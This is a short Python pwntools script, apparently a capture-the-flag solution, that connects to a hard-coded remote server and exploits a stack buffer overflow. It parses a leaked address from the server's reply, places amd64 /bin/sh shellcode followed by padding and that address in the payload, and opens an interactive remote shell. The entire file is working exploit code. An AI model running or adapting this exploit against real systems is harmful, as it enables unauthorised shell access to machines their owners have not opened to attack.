from pwn import *
import re

r = remote("167.172.231.203", 8889) # the server to pwn

r.recv()
resp = r.recv()
print(resp)

hexStr = p64(int(re.findall(b"([a-f0-9]{8,16})", resp)[0],16))

context.arch = "amd64" # hopefully amd hires me
shellcode = asm(shellcraft.amd64.sh())

payload = shellcode + b"a"*(112 + 8 - 48) + hexStr

r.sendline(payload)

r.interactive()
